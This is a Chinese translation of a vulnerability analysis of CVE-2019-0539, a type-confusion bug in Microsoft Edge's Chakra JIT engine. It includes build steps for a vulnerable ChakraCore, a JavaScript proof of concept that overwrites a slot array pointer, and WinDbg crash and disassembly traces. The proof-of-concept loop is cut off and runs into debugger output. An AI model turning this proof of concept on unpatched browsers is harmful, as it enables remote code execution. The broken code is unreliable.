# Microsoft Edge CVE-2019-0539 漏洞分析与利用
|
##### 译文声明
本文是翻译文章，文章原作者 perception-point，文章来源：perception-point.io
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
本文对Microsoft Edge的CVE-2019-0539漏洞进行了详细的分析，并利用漏洞实现完全的读写控制，最终实现RCE。
## 简介
微软在2019年1月的 Microsoft Edge Chakra Engine
[更新](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0539)中[修复](https://github.com/Microsoft/ChakraCore/commit/788f17b0ce06ea84553b123c174d1ff7052112a0)了CVE-2019-0539漏洞。该漏洞和其他两个漏洞由Google
Project Zero的Lokihardt 发现并[报告](https://bugs.chromium.org/p/project-zero/issues/detail?id=1702)。该漏洞可以通过访问恶意网页导致远程代码执行。正如Lokihardt所述，当Chakra JIT
javascript编译器生成的代码不经意间发生了对象类型转换，并且错误地认为这种转换后续对该对象没有影响，这时就会发生类型混淆漏洞。Chakra开发团队的Abhijith
Chatra在其博客中讲到，动态类型对象包含一个property map和一个slot array。property map用来掌握一个对象属性在slot
array中的索引，而slot array则存储属性的真实数据。CVE-2019-0539会引发JIT代码的内存对象混淆，从而导致slot
array指针被任意数据覆写。
## 漏洞根源分析
###  设置
设置好windows的ChakraCore漏洞版本：
(在Visual Studio MSBuild命令提示符中)
    c:code>git clone https://github.com/Microsoft/ChakraCore.git
    c:code>cd ChakraCore
    c:codeChakraCore>git checkout 331aa3931ab69ca2bd64f7e020165e693b8030b5
    c:codeChakraCore>msbuild /m /p:Platform=x64 /p:Configuration=Debug BuildChakra.Core.sln
###  Time Travel Debugging
本篇文章将使用 **TTD (Time Travel Debugging)** ，微软官方文档介绍如下：
> Time Travel Debugging是一款调试器工具，允许你记录正在运行进程的执行轨迹，然后向前、向后进行重放。 Time Travel
> Debugging (TTD) 可以让你“回放”调试器会话，而不必重新启动触发错误，从而帮助你更轻松的调试解决各种问题。
从[Microsoft Store](https://www.microsoft.com/en-us/p/windbg-preview/9pgjgd53tn86?activetab=pivot:overviewtab)下载安装最新版的Windbg。
运行时记得要以管理员身份运行。
###  根源分析
Poc:
    function opt(o, c, value) {
        o.b = 1;
        class A extends c { // may transition the object
        }
        o.a = value; // overwrite slot array pointer
    }
    function main() {
        for (let i = 0; i  !tt 0
    Setting position to the beginning of the trace
    Setting position: 14:0
    (1e8c.4bc8): Break instruction exception - code 80000003 (first/second chance not available)
    Time Travel Position: 14:0
    ntdll!LdrInitializeThunk:
    00007fff`03625640 4053            push    rbx
    0:000> g
    ModLoad: 00007fff`007e0000 00007fff`0087e000   C:WindowsSystem32sechost.dll
    ModLoad: 00007fff`00f40000 00007fff`00fe3000   C:WindowsSystem32advapi32.dll
    ModLoad: 00007ffe`ffde0000 00007ffe`ffe00000   C:WindowsSystem32win32u.dll
    ModLoad: 00007fff`00930000 00007fff`00ac7000   C:WindowsSystem32USER32.dll
    ModLoad: 00007ffe`ff940000 00007ffe`ffada000   C:WindowsSystem32gdi32full.dll
    ModLoad: 00007fff`02e10000 00007fff`02e39000   C:WindowsSystem32GDI32.dll
    ModLoad: 00007fff`03420000 00007fff`03575000   C:WindowsSystem32ole32.dll
    ModLoad: 00007ffe`ffdb0000 00007ffe`ffdd6000   C:WindowsSystem32bcrypt.dll
    ModLoad: 00007ffe`e7c20000 00007ffe`e7e0d000   C:WindowsSYSTEM32dbghelp.dll
    ModLoad: 00007ffe`e7bf0000 00007ffe`e7c1a000   C:WindowsSYSTEM32dbgcore.DLL
    ModLoad: 00007ffe`9bf10000 00007ffe`9dd05000   c:ppChakraCoreBuildVcBuildbinx64_debugchakracore.dll
    ModLoad: 00007fff`011c0000 00007fff`011ee000   C:WindowsSystem32IMM32.DLL
    ModLoad: 00007ffe`ff5b0000 00007ffe`ff5c1000   C:WindowsSystem32kernel.appcore.dll
    ModLoad: 00007ffe`f0f80000 00007ffe`f0fdc000   C:WindowsSYSTEM32Bcp47Langs.dll
    ModLoad: 00007ffe`f0f50000 00007ffe`f0f7a000   C:WindowsSYSTEM32bcp47mrm.dll
    ModLoad: 00007ffe`f0fe0000 00007ffe`f115b000   C:WindowsSYSTEM32windows.globalization.dll
    ModLoad: 00007ffe`ff010000 00007ffe`ff01c000   C:WindowsSYSTEM32CRYPTBASE.DLL
    (1e8c.20b8): Access violation - code c0000005 (first/second chance not available)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    Time Travel Position: 90063:0
    chakracore!Js::DynamicTypeHandler::GetSlot+0x149:
    00007ffe`9cd1ec79 488b04c1        mov     rax,qword ptr [rcx+rax*8] ds:00010000`00001234=????????????????
    0:004> ub
    chakracore!Js::DynamicTypeHandler::GetSlot+0x12d [c:ppchakracorelibruntimetypestypehandler.cpp @ 96]:
    00007ffe`9cd1ec5d 488b442450      mov     rax,qword ptr [rsp+50h]
    00007ffe`9cd1ec62 0fb74012        movzx   eax,word ptr [rax+12h]
    00007ffe`9cd1ec66 8b4c2460        mov     ecx,dword ptr [rsp+60h]
    00007ffe`9cd1ec6a 2bc8            sub     ecx,eax
    00007ffe`9cd1ec6c 8bc1            mov     eax,ecx
    00007ffe`9cd1ec6e 4898            cdqe
    00007ffe`9cd1ec70 488b4c2458      mov     rcx,qword ptr [rsp+58h] // object pointer
    00007ffe`9cd1ec75 488b4910        mov     rcx,qword ptr [rcx+10h] // slot array pointer
    0:004> ba w 8 poi(@rsp+58)+10
    0:004> g-    Breakpoint 1 hit
    Time Travel Position: 9001D:178A
    00000195`cc9c0159 488bc7          mov     rax,rdi
下面是最终阶段覆写slot
array指针的JIT代码。注意`chakracore!Js::JavascriptOperators::OP_InitClass`的调用。正如Lokihardt解释的那样，这个函数最终将会调用SetIsPrototype，从而转换对象类型。
    0:004> ub @rip L20
    00000195`cc9c00c6 ef              out     dx,eax
    00000195`cc9c00c7 0000            add     byte ptr [rax],al
    00000195`cc9c00c9 004c0f45        add     byte ptr [rdi+rcx+45h],cl
    00000195`cc9c00cd f249895e18      repne mov qword ptr [r14+18h],rbx
    00000195`cc9c00d2 4c8bc7          mov     r8,rdi
    00000195`cc9c00d5 498bcf          mov     rcx,r15
    00000195`cc9c00d8 48baf85139ca95010000 mov rdx,195CA3951F8h
    00000195`cc9c00e2 48b8d040a39cfe7f0000 mov rax,offset chakracore!Js::ScriptFunction::OP_NewScFuncHomeObj (00007ffe`9ca340d0)
    00000195`cc9c00ec 48ffd0          call    rax
    00000195`cc9c00ef 488bd8          mov     rbx,rax
    00000195`cc9c00f2 498bd5          mov     rdx,r13
    00000195`cc9c00f5 488bcb          mov     rcx,rbx
    00000195`cc9c00f8 c60601          mov     byte ptr [rsi],1
    00000195`cc9c00fb 49b83058e8c995010000 mov r8,195C9E85830h
    00000195`cc9c0105 48b88041679cfe7f0000 mov rax,offset chakracore!Js::JavascriptOperators::OP_InitClass (00007ffe`9c674180) // transitions the type of the object 
    00000195`cc9c010f 48ffd0          call    rax
    00000195`cc9c0112 803e01          cmp     byte ptr [rsi],1
    00000195`cc9c0115 0f85dc000000    jne     00000195`cc9c01f7
    00000195`cc9c011b 488bc3          mov     rax,rbx
    00000195`cc9c011e 48c1e830        shr     rax,30h
    00000195`cc9c0122 0f85eb000000    jne     00000195`cc9c0213
    00000195`cc9c0128 4c8b6b08        mov     r13,qword ptr [rbx+8]
    00000195`cc9c012c 498bc5          mov     rax,r13
    00000195`cc9c012f 48c1e806        shr     rax,6
    00000195`cc9c0133 4883e007        and     rax,7
    00000195`cc9c0137 48b9b866ebc995010000 mov rcx,195C9EB66B8h